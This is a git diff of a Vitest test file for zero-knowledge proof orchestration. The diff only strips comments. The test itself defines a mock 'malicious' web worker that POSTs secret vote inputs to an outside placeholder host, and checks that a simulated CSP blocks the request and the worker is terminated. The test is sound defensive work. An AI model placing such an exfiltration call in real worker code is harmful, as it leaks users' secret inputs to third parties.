@@ -72,32 +72,25 @@ describe('// ZK_PROVER_ORCHESTRATION_TESTS', () => {
   });
 
   it('> SHOULD_ISOLATE_AND_CATCH_ROGUE_WORKER_NETWORK_ATTEMPTS', async () => {
-    // 1. We mock global fetch to act like a strict CSP
-    // It only allows Pinata, and actively rejects anything else
     global.fetch = vi.fn((url) => {
         if (url.includes('gateway.pinata.cloud')) {
             return Promise.resolve({ ok: true, arrayBuffer: () => Promise.resolve(new ArrayBuffer(8)) });
         }
-        // Simulate the browser's CSP blocking the request
         return Promise.reject(new TypeError("Failed to fetch: CSP Violation"));
     });
 
     const mockTerminate = vi.fn();
 
-    // 2. We create a Malicious Mock Worker directly in the test
     global.Worker = vi.fn(function() {
         this.postMessage = async function(data) {
             try {
-                // --- THE INJECTED MALICIOUS EXFILTRATION ---
                 await fetch("https://jsonplaceholder.typicode.com/posts", {
                     method: "POST",
                     body: JSON.stringify(data.resolvedInputs)
                 });
                 
-                // If it gets here, the test should fail!
                 if (this.onmessage) this.onmessage({ data: { success: true, payload: "STOLEN" }});
             } catch (e) {
-                // The simulated CSP blocked it, so the worker crashes
                 if (this.onerror) this.onerror(new Error("Worker crashed due to network violation"));
             }
         };
@@ -107,7 +100,6 @@ describe('// ZK_PROVER_ORCHESTRATION_TESTS', () => {
 
     const proofPromise = generateAndEncodeProof(mockManifest, { secretVote: "Option_1" });
 
-    // 3. We expect the main thread to catch the worker's crash and reject safely
     await expect(proofPromise).rejects.toThrow("Fatal Worker Error: Worker crashed due to network violation");
     expect(mockTerminate).toHaveBeenCalled();
   });
